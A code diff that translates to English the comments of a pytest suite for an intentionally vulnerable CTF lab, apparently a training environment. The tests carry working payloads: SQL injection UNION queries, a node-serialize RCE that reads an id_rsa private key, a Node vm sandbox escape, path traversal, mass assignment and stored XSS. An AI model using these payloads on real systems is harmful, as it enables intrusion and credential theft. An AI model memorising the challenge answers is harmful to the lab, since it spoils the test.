@@ -1,14 +1,14 @@
-"""Tests d'intégration : une vérification par faille / easter egg du challenge.
+"""Integration tests: one check per challenge flaw / easter egg.
 
-Chaque test rejoue (de façon adaptée) le write-up correspondant de
-cflix1_exploits et affirme que le trou est toujours présent et exploitable, et
-que l'easter egg attendu est toujours récupérable — malgré la modernisation de
-la stack (.NET 10, Node 26, PHP 8, MySQL 9, PostgreSQL 18...).
+Each test replays (in an adapted form) the matching cflix1_exploits write-up and
+asserts that the hole is still present and exploitable, and that the expected
+easter egg is still recoverable — despite the modernization of the stack
+(.NET 10, Node 26, PHP 8, MySQL 9, PostgreSQL 18...).
 
-Les épreuves dépendant d'une infrastructure externe à la stack (NAS/SMB pour la
-partie exfiltration de l'épreuve 5, requestb.in pour l'épreuve 12, les épreuves
-bonus basées sur des affiches/images) ne sont pas rejouées intégralement : on
-vérifie le trou applicatif qui les rend possibles.
+Challenges that depend on infrastructure external to the stack (NAS/SMB for the
+exfiltration part of challenge 5, requestb.in for challenge 12, the bonus
+challenges based on posters/images) are not replayed end to end: we verify the
+application-level hole that makes them possible.
 """
 import codecs
 import json
@@ -27,76 +27,76 @@ UA = {"User-Agent": "cflix-tests", "Accept-Encoding": "none"}
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 1 — XSS stockée (Html.Raw) : easter egg caché dans un commentaire
+# Challenge 1 — stored XSS (Html.Raw): easter egg hidden in a comment
 # --------------------------------------------------------------------------- #
 def test_01_xss_stored_easter_egg(user_session):
     r = user_session.get(f"{CFLIX_URL}/Media/1", headers=UA)
     assert r.status_code == 200
-    # Le trou : le contenu des reviews est rendu via @Html.Raw -> le <script>
-    # injecté par l'attaquant est présent tel quel (non échappé).
-    assert "<script" in r.text.lower(), "le HTML brut de la review devrait passer (Html.Raw)"
-    # L'easter egg est caché dans un de ces commentaires.
-    assert FLAGS["p1_xss"] in r.text, "easter egg de l'épreuve 1 introuvable"
+    # The hole: review content is rendered through @Html.Raw -> the attacker's
+    # injected <script> is served verbatim (not escaped).
+    assert "<script" in r.text.lower(), "raw review HTML should go through (Html.Raw)"
+    # The easter egg is hidden in one of those comments.
+    assert FLAGS["p1_xss"] in r.text, "challenge 1 easter egg not found"
 
 
 # --------------------------------------------------------------------------- #
-# Épreuves 2, 3, 5 — Injection SQL (FromSqlRaw + concaténation)
-# UNION pour exfiltrer le contenu des reviews cachées (ids 12, 10, 11).
+# Challenges 2, 3, 5 — SQL injection (FromSqlRaw + concatenation)
+# UNION to exfiltrate the content of the hidden reviews (ids 12, 10, 11).
 # --------------------------------------------------------------------------- #
 def _sqli_review(sess, review_id):
     q = (f"1' and 1=0 union select 1,2,Content,4,null,null "
          f"from Reviews where id={review_id} -- -")
     r = sess.get(f"{CFLIX_URL}/Search", params={"query": q}, headers=UA)
     assert r.status_code == 200
-    assert "DBError" not in r.text, "la requête SQLi a provoqué une erreur DB"
+    assert "DBError" not in r.text, "the SQLi query triggered a DB error"
     m = re.search(r'<img[^>]*src="2"[^>]*alt="([^"]*)"', r.text, re.S)
-    assert m, f"la projection UNION (review {review_id}) n'est pas remontée dans le HTML"
+    assert m, f"the UNION projection (review {review_id}) did not surface in the HTML"
     return m.group(1)
 
 
 def test_02_sqli_union_review12(user_session):
     alt = _sqli_review(user_session, 12)
-    assert len(alt) > 50, "contenu de la review 12 non exfiltré"
-    # La review 12 est le message « officiel » contenant l'indice de l'épreuve.
+    assert len(alt) > 50, "review 12 content not exfiltrated"
+    # Review 12 is the "official" message carrying the challenge hint.
     assert "Oups" in alt or "soucis" in alt
 
 
 def test_03_sqli_union_review10(user_session):
     alt = _sqli_review(user_session, 10)
-    # Review 10 : charge JS obfusquée (packer) cachant l'easter egg.
+    # Review 10: obfuscated JS payload (packer) hiding the easter egg.
     assert "powned" in alt or "eval" in alt or len(alt) > 1000
 
 
 def test_05_sqli_union_review11(user_session):
     alt = _sqli_review(user_session, 11)
-    # Review 11 : indice menant au partage NAS (l'exfiltration SMB elle-même
-    # sort du périmètre de la stack docker-compose).
+    # Review 11: hint pointing to the NAS share (the SMB exfiltration itself is
+    # out of scope for the docker-compose stack).
     assert len(alt) > 500
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 4 — Mass Assignment : élévation vers le compte Alpha
+# Challenge 4 — mass assignment: elevation to the Alpha account
 # --------------------------------------------------------------------------- #
 def test_04_mass_assignment_to_alpha():
-    s = new_session(elevate_alpha=True)   # poste AccountType=Alpha (champ non prévu)
+    s = new_session(elevate_alpha=True)   # posts AccountType=Alpha (unexpected field)
     r = s.get(f"{CFLIX_URL}/Profile/me", headers=UA)
-    assert "Alpha" in r.text, "l'élévation en Alpha (mass assignment) a échoué"
-    # Conséquence concrète : accès à la zone réservée aux Alpha (Viewer).
+    assert "Alpha" in r.text, "Alpha elevation (mass assignment) failed"
+    # Concrete consequence: access to the Alpha-only area (Viewer).
     r = s.get(f"{CFLIX_URL}/Viewer", params={"mediaId": "6"}, headers=UA)
-    assert r.status_code == 200, "un compte Alpha devrait accéder au Viewer"
+    assert r.status_code == 200, "an Alpha account should be able to reach the Viewer"
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 6 — mot de passe du post-it (statique) : sert d'accès à l'épreuve 7
+# Challenge 6 — post-it password (static): used as the entry point for challenge 7
 # --------------------------------------------------------------------------- #
 def test_06_postit_password_is_cartman_ssh():
-    # L'easter egg de l'épreuve 6 est le mot de passe SSH de cartman (épreuve 7).
-    # On le vérifie indirectement : il doit permettre l'accès SSH (cf. test 07).
+    # The challenge 6 easter egg is cartman's SSH password (challenge 7). We
+    # verify it indirectly: it must grant SSH access (see test 07).
     assert FLAGS["p6_postit"] == CARTMAN_PASSWORD
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 7 — SSH (cartman) sur l'ImageViewer + récupération du pcap
+# Challenge 7 — SSH (cartman) on the ImageViewer + pcap retrieval
 # --------------------------------------------------------------------------- #
 def test_07_cartman_ssh_and_pcap(tmp_path):
     paramiko = pytest.importorskip("paramiko")
@@ -112,15 +112,15 @@ def test_07_cartman_ssh_and_pcap(tmp_path):
         ftp.close()
     finally:
         c.close()
-    assert local.stat().st_size > 0, "pcap vide / non récupéré"
+    assert local.stat().st_size > 0, "pcap empty / not retrieved"
 
-    # Décodage optionnel (comme le write-up) si scapy est disponible. On balaie
-    # les charges utiles à la recherche d'un jeton base64 décodant vers un flag
-    # (robuste au format de clé de session qui varie selon la version de scapy).
+    # Optional decoding (like the write-up) if scapy is available. We scan the
+    # payloads for a base64 token decoding to a flag (robust to the session-key
+    # format, which varies across scapy versions).
     try:
         from scapy.all import rdpcap, Raw
     except Exception:
-        pytest.skip("scapy absent : récupération du pcap vérifiée, décodage ignoré")
+        pytest.skip("scapy missing: pcap retrieval verified, decoding skipped")
     pcap = rdpcap(str(local))
     found = None
     for pkt in pcap:
@@ -142,11 +142,11 @@ def test_07_cartman_ssh_and_pcap(tmp_path):
                 break
         if found:
             break
-    assert found, "aucun flag CFl1X- décodable trouvé dans le pcap"
+    assert found, "no decodable CFl1X- flag found in the pcap"
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 8 — LFI / directory traversal sur le CFlix.ImageViewer
+# Challenge 8 — LFI / directory traversal on CFlix.ImageViewer
 # --------------------------------------------------------------------------- #
 def test_08_lfi_directory_traversal(alpha_session):
     r = alpha_session.get(f"{CFLIX_URL}/Viewer/View",
@@ -155,11 +155,11 @@ def test_08_lfi_directory_traversal(alpha_session):
                           headers=UA)
     assert r.status_code == 200
     data = json.loads(codecs.decode(r.content, "utf-8-sig"))
-    assert data.get("flag") == FLAGS["p8_lfi"], "LFI : flag attendu non lu"
+    assert data.get("flag") == FLAGS["p8_lfi"], "LFI: expected flag not read"
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 9 — Désérialisation NodeJS (node-serialize 0.0.4, CVE-2017-5941)
+# Challenge 9 — NodeJS deserialization (node-serialize 0.0.4, CVE-2017-5941)
 # --------------------------------------------------------------------------- #
 def _nodejs_rce(command):
     payload = ('{ "payload": "_$$ND_FUNC$$_function(){ var result = '
@@ -168,26 +168,26 @@ def _nodejs_rce(command):
     r = requests.post(f"{HACKO_URL}/cookie", data=payload, verify=False, timeout=20,
                       headers={**UA, "Host": HACKO_HOST,
                                "Content-Type": "application/x-www-form-urlencoded"})
-    assert r.status_code == 200, f"/cookie a répondu {r.status_code}"
+    assert r.status_code == 200, f"/cookie responded {r.status_code}"
     return r.text
 
 
 def test_09_nodeserialize_rce_passphrase():
     out = _nodejs_rce("cat README.md")
-    # RCE confirmée : le README de l'attaquant contient la passphrase de la clé.
-    assert FLAGS["p9_passphrase"] in out, "RCE node-serialize KO (passphrase absente)"
+    # RCE confirmed: the attacker's README contains the key passphrase.
+    assert FLAGS["p9_passphrase"] in out, "node-serialize RCE failed (passphrase missing)"
 
 
 def test_09_nodeserialize_rce_reads_private_key():
     out = _nodejs_rce("cat id_rsa")
-    assert "PRIVATE KEY" in out, "la clé privée id_rsa devrait être exfiltrable via la RCE"
+    assert "PRIVATE KEY" in out, "the id_rsa private key should be exfiltrable via the RCE"
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 10 — Évasion de la sandbox `vm` (SSH port 845) + code nucléaire
+# Challenge 10 — `vm` sandbox escape (SSH port 845) + nuclear code
 # --------------------------------------------------------------------------- #
 def _hacko_ssh_key():
-    """Récupère + déchiffre la clé privée via la RCE de l'épreuve 9 (chaînage)."""
+    """Fetch + decrypt the private key via the challenge 9 RCE (chaining)."""
     paramiko = pytest.importorskip("paramiko")
     import io
     key_pem = json.loads(_nodejs_rce("cat id_rsa"))["payload"]
@@ -200,11 +200,11 @@ _ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
 
 
 def _hacko_vm_exec(js):
-    """Exécute une commande dans la sandbox vm (vorpal) via SSH (user hackonymousoflix).
+    """Run a command in the vm sandbox (vorpal) over SSH (user hackonymousoflix).
 
-    Le shell de login est vm.js (vorpal, interactif) : on ouvre un shell, on
-    laisse défiler la bannière, on envoie la commande, puis on lit la sortie en
-    nettoyant les séquences ANSI d'édition de ligne.
+    The login shell is vm.js (vorpal, interactive): we open a shell, let the
+    banner scroll by, send the command, then read the output while stripping the
+    ANSI line-editing sequences.
     """
     import time
     paramiko, pkey = _hacko_ssh_key()
@@ -229,7 +229,7 @@ def _hacko_vm_exec(js):
                     time.sleep(0.1)
             return buf
 
-        drain(2.5)                 # bannière / invite vorpal
+        drain(2.5)                 # banner / vorpal prompt
         chan.sendall(js + "\n")
         out = drain(4.0)
         return _ANSI.sub("", out.decode("latin-1")).replace("\r", "")
@@ -238,36 +238,30 @@ def _hacko_vm_exec(js):
 
 
 def test_10_vm_sandbox_escape_reads_nuclear_access():
-    # Évasion du contexte vm : on lit un fichier hors sandbox via le constructeur
-    # de constructeur (process.mainModule...). On cible .shell.sh qui contient
-    # NUCLEAR_BOMB_ACCESS, prouvant l'évasion.
+    # vm context escape: read a file outside the sandbox through the
+    # constructor-of-a-constructor trick (process.mainModule...). We target
+    # .shell.sh, which contains NUCLEAR_BOMB_ACCESS, proving the escape.
     js = ("exec eval(String('t').concat('his')).constructor.constructor("
           "String('console.l').concat"
           "('og(process.mainModule.constructor._load(\\'fs\\')"
           ".readFileSync(\\'/home/hackonymousoflix/.shell.sh\\').toString())'))()")
     out = _hacko_vm_exec(js)
     assert FLAGS["p10_access"] in out, \
-        "évasion vm KO : NUCLEAR_BOMB_ACCESS non lu hors sandbox"
+        "vm escape failed: NUCLEAR_BOMB_ACCESS not read outside the sandbox"
 
 
 def test_10_nuclear_password_accepted():
-    # Easter egg : le bon code nucléaire déclenche la séquence (régression
-    # critique corrigée : crypto.createCipher supprimé en Node 18+).
+    # Easter egg: the correct nuclear code triggers the sequence (critical
+    # regression fixed: crypto.createCipher removed in Node 18+).
     js = f"launchnb none {FLAGS['p10_nuclear']}"
     out = _hacko_vm_exec(js)
     assert ("Félicitations" in out or "troisième guerre" in out or "bash" in out), \
-        "le code nucléaire n'est plus accepté (régression crypto.createCipher ?)"
+        "the nuclear code is no longer accepted (crypto.createCipher regression?)"
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 11 — Exploitation binaire : propriétés qui rendent le ret2win possible
+# Challenge 11 — binary exploitation: properties that keep ret2win possible
 # --------------------------------------------------------------------------- #
-def _hacko_container():
-    import os
-    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-    return base  # non utilisé, cf. docker
-
-
 def _compose_dir():
     import os
     return os.path.join(
@@ -286,33 +280,33 @@ def _docker_compose(*args):
 
 
 def test_11_binary_is_exploitable_by_design():
-    # Le binaire setuid doit rester non-PIE (adresse fixe de `faille`) et
-    # sans protections, sinon le write-up ret2win ne fonctionnerait plus.
+    # The setuid binary must stay non-PIE (fixed address of `faille`) and
+    # without protections, otherwise the ret2win write-up would no longer work.
     ls = _docker_exec("hackonymousoflix", "ls -l /home/will.byers/exploit")
-    assert ls.startswith("-rws"), f"le bit setuid manque : {ls!r}"
+    assert ls.startswith("-rws"), f"the setuid bit is missing: {ls!r}"
     etype = _docker_exec("hackonymousoflix", "readelf -h /home/will.byers/exploit | grep Type:")
-    assert "EXEC" in etype, f"le binaire ne doit pas être PIE (ret2win) : {etype!r}"
+    assert "EXEC" in etype, f"the binary must not be PIE (ret2win): {etype!r}"
     faille = _docker_exec("hackonymousoflix",
                           "objdump -d /home/will.byers/exploit | grep '<faille>:'")
-    assert "faille" in faille, "symbole `faille` (la cible du ret2win) absent"
+    assert "faille" in faille, "the `faille` symbol (the ret2win target) is missing"
 
 
 # --------------------------------------------------------------------------- #
-# Épreuve 12 — RobotShop (PHP) : XSS stockée + page admin protégée par cookie
+# Challenge 12 — RobotShop (PHP): stored XSS + cookie-protected admin page
 # --------------------------------------------------------------------------- #
 def test_12_robotshop_admin_flag_via_cookie():
     r = requests.get(f"{ROBOTSHOP_URL}/shop_administrator.php",
                      cookies={"adminCookie": FLAGS["admin_cookie"]},
                      headers=UA, timeout=15)
     assert r.status_code == 200
-    assert FLAGS["p12_robotshop"] in r.text, "flag admin RobotShop introuvable"
+    assert FLAGS["p12_robotshop"] in r.text, "RobotShop admin flag not found"
 
 
 def test_12_robotshop_contact_is_xss_sink():
-    # Le trou : contact.php stocke le message sans échappement (xssSanitizer est
-    # un no-op) -> le bot admin (shoxx-bot) l'exécute en consultant read.php
-    # (vol de cookie à l'origine). On met le bot en pause pour que read.php ne
-    # soit pas vidé par lui pendant la vérification du sink.
+    # The hole: contact.php stores the message without escaping (xssSanitizer is
+    # a no-op) -> the admin bot (shoxx-bot) runs it when visiting read.php
+    # (cookie theft originally). We pause the bot so it does not drain read.php
+    # while we check the sink.
     marker = "<script>/*cflix-xss-probe*/</script>"
     _docker_compose("pause", "shoxxbot")
     try:
@@ -326,4 +320,4 @@ def test_12_robotshop_contact_is_xss_sink():
     finally:
         _docker_compose("unpause", "shoxxbot")
     assert r.status_code == 200
-    assert marker in r.text, "read.php devrait restituer le message brut (sink XSS)"
+    assert marker in r.text, "read.php should echo the raw message (XSS sink)"
